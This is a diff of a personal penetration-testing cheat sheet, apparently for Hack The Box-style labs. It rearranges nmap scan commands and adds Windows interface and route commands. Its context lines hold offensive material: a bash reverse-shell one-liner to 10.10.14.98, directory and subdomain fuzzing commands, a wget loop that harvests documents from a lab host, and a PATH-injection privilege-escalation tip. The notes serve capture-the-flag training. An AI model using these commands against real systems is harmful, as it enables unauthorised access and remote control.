@@ -1,12 +1,17 @@
 TOOLS
 https://www.revshells.com/
-https://github.com/21y4d/nmapAutomator
 
-USEFUL COMMANDS
-BOX=ip
+NMAP
+https://github.com/21y4d/nmapAutomator
 sudo nmap -sC -sV -oN AA.nmap AA.htb -v; sudo nmap -sS -sV -sC -T5 -p- -oN AA.full.nmap AA.htb -v
 FROM IP LIST: nmap -sCV -v -oN all.nmap -iL all.txt
 FAST PING SCAN: nmap -sP -T5 --min-parallelism 100 192.168.137.*
+NMAP double specific udp/tcp scan oneliner: nmap localhost -sUT -p U:2222,T:44818
+List interfaces (useful on Windows): nmap --iflist // nmap -e eth3
+
+
+USEFUL COMMANDS
+BOX=ip
 gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -k -u 
 ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://knife.htb/ -H 'Host: FUZZ.schooled.htb' -fs 5815
 sudo !!
@@ -165,9 +170,6 @@ do
 	do wget http://10.129.245.165/documents/2020-$m-$d-upload.pdf
 	done
 done
-
-NMAP double specific udp/tcp scan oneliner
-nmap localhost -sUT -p U:2222,T:44818
 
 REV SHELLS
 bash -i >& /dev/tcp/10.10.14.98/5555 0>&1
@@ -407,13 +409,10 @@ PATH INJECTION VULN
 export PATH=$(pwd):$PATH
 and put your own crafted binary when it is called directly in a script as root
 
-NMAP commands
-List interfaces (useful on Windows):
-nmap --iflist
-
-ADD IPs ON WINDOWS
+ADD IPs and ROUTES ON WINDOWS
 netsh interface ipv4 show interfaces
 netsh interface ipv4 add address "GigabitPLCSwitch" 192.168.137.185 255.255.0.0
-Delete:
-netsh interface ipv4 delete address "GigabitPLCSwitch" 192.168.137.185
-
+Delete: netsh interface ipv4 delete address "GigabitPLCSwitch" 192.168.137.185
+route print
+route add 133.12.0.0 MASK 255.255.0.0 133.11.27.101 IF 14
+route DELETE 133.12.0.0
